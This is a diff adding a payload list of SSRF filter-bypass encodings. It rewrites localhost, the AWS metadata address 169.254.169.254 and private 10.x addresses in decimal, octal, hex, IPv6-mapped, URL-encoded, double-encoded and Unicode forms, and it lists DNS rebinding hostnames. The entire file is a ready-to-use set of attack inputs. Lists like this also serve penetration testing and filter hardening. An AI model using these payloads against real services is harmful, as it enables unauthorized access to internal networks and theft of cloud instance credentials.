@@ -1,0 +1,58 @@
+# IP Address Representation Bypass Techniques
+# Target: 127.0.0.1 (localhost)
+
+# Decimal
+2130706433
+
+# Octal
+0177.0.0.01
+0177.0000.0000.0001
+
+# Hex
+0x7f.0x0.0x0.0x1
+0x7f000001
+
+# Mixed
+0177.0.0.1
+127.0x0.0.1
+
+# IPv6
+::1
+::ffff:127.0.0.1
+0:0:0:0:0:ffff:127.0.0.1
+::ffff:7f00:1
+
+# DNS rebinding targets (use rebind services)
+# 7f000001.nip.io
+# 127.0.0.1.nip.io
+# localtest.me (resolves to 127.0.0.1)
+
+# URL encoding
+%31%32%37%2e%30%2e%30%2e%31
+
+# Double URL encoding
+%2531%2532%2537%252e%2530%252e%2530%252e%2531
+
+# Unicode variations
+①②⑦.⓪.⓪.①
+
+# Target: 169.254.169.254 (AWS metadata)
+
+# Decimal
+2852039166
+
+# Hex
+0xa9.0xfe.0xa9.0xfe
+0xa9fea9fe
+
+# IPv6
+::ffff:169.254.169.254
+::ffff:a9fe:a9fe
+
+# Target: 10.0.0.0/8 (private network)
+
+# Decimal 10.0.0.1
+167772161
+
+# Decimal 10.255.255.255
+184549375
